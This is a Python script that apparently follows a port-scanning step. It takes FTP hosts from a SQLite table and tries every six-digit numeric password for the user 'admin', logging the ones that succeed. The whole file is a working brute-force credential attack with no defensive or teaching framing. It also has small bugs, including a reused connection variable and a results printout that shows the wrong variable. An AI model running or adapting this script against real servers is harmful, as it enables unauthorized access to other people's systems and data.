from ftplib import FTP
import sqlite3

user = 'admin'
hosts_passwords = {}

print('Connecting db...')
connection = sqlite3.connect('port_scanning_tec.db')
cursor = connection.cursor()

cursor.execute('''
            create table if not exists ports_info(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            host VARCHAR(16) NOT NULL,
            port INTEGER NOT NULL,
            state VARCHAR(30) NOT NULL,
            service VARCHAR(100) NOT NULL,
            UNIQUE (host, port, state, service)
            );''')
connection.commit()
print('Done!\n\n')

data = cursor.execute('SELECT host FROM ports_info WHERE service = "ftp"')
hosts = data.fetchall()

for host in hosts:
    print(f'Trying {host[0]}...\n')
    for password in range(1_000_000):
        try:
            connection = FTP(host[0])
            connection.login(user, f'{password:06}')
            hosts_passwords[host[0]] = f'{password:06}'
        except Exception:
            pass

print()

if hosts_passwords:
    print(f'Successful connection with user "{user}"\n\n')
    for key, value in hosts_passwords.items():
        print(f'''
              Host: {host}
              Password: {value}\n\n''')
else:
    print(f'No successful connection with user "{user}"')
